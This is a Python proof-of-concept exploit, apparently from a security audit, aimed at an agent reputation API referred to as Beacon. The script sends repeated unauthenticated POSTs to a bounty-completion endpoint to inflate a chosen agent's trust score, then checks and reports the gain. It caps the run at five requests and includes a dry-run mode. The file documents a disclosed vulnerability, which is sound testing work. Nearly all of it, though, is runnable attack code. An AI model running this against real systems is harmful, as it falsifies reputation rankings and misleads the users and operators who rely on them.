#!/usr/bin/env python3
"""
PoC: Trust Score Inflation via Unauthenticated Bounty Completion (CRIT-02)

Demonstrates that any client can inflate an agent's trust score by repeatedly
calling the bounty completion endpoint with no authentication.

Usage (against testnet only):
    python attack_02_trust_inflation.py --agent bcn_attacker --url http://localhost:5000
"""

import argparse
import json
import sys
from urllib.request import Request, urlopen
from urllib.error import HTTPError


def get_reputation(base_url, agent_id):
    """Fetch current reputation score for an agent."""
    url = f"{base_url}/api/reputation/{agent_id}"
    try:
        req = Request(url, headers={"Accept": "application/json"})
        with urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read())
            return data.get("score", 0)
    except HTTPError:
        return 0


def complete_bounty(base_url, bounty_id, agent_id):
    """
    Mark a bounty as completed by agent_id.
    
    The /api/bounties/<id>/complete endpoint:
    1. Has NO authentication
    2. Adds +10 to agent's reputation score
    3. Does NOT verify the agent actually completed the work
    """
    url = f"{base_url}/api/bounties/{bounty_id}/complete"
    payload = json.dumps({"agent_id": agent_id}).encode()
    req = Request(url, data=payload, headers={"Content-Type": "application/json"}, method="POST")
    try:
        with urlopen(req, timeout=10) as resp:
            return json.loads(resp.read())
    except HTTPError as e:
        return {"error": f"HTTP {e.code}"}


def inflate_score(base_url, agent_id, target_score=1000):
    """
    Inflate an agent's trust score to the target by repeatedly completing bounties.
    
    Each completion grants +10 points. To reach 1000 points, we need 100 completions.
    """
    current_score = get_reputation(base_url, agent_id)
    print(f"[*] Current score: {current_score}")
    
    completions_needed = max(0, (target_score - current_score) // 10)
    print(f"[*] Need {completions_needed} fake completions to reach {target_score}")
    
    # In a real attack, we'd iterate through bounty IDs
    # For PoC, we show the methodology
    for i in range(min(completions_needed, 5)):  # Cap at 5 for safety
        bounty_id = f"fake-bounty-{i}"
        result = complete_bounty(base_url, bounty_id, agent_id)
        print(f"  [{i+1}] Complete bounty '{bounty_id}': {result}")
    
    new_score = get_reputation(base_url, agent_id)
    print(f"\n[*] New score: {new_score} (was {current_score})")
    if new_score > current_score:
        print(f"[!!!] CONFIRMED: Score inflated by {new_score - current_score} points")
    
    return new_score


def main():
    parser = argparse.ArgumentParser(description="PoC: Trust Score Inflation")
    parser.add_argument("--agent", required=True, help="Agent ID to inflate")
    parser.add_argument("--url", default="http://localhost:5000", help="Beacon API base URL")
    parser.add_argument("--target-score", type=int, default=1000, help="Target score")
    parser.add_argument("--dry-run", action="store_true", help="Only show what would happen")
    args = parser.parse_args()

    if args.dry_run:
        completions = args.target_score // 10
        print(f"[DRY RUN] Attack plan:")
        print(f"  Target agent: {args.agent}")
        print(f"  Target score: {args.target_score}")
        print(f"  Completions needed: {completions}")
        print(f"  Time to execute: ~{completions * 0.1:.1f} seconds")
        print(f"\n[!] No authentication required")
        print(f"[!] Each POST to /api/bounties/<id>/complete adds +10 to score")
        print(f"[!] Agent could reach #1 ranking in seconds")
        return

    print(f"[*] PoC: Trust Score Inflation for agent '{args.agent}'")
    print(f"[*] Target: {args.target_score} points\n")
    
    try:
        inflate_score(args.url, args.agent, args.target_score)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
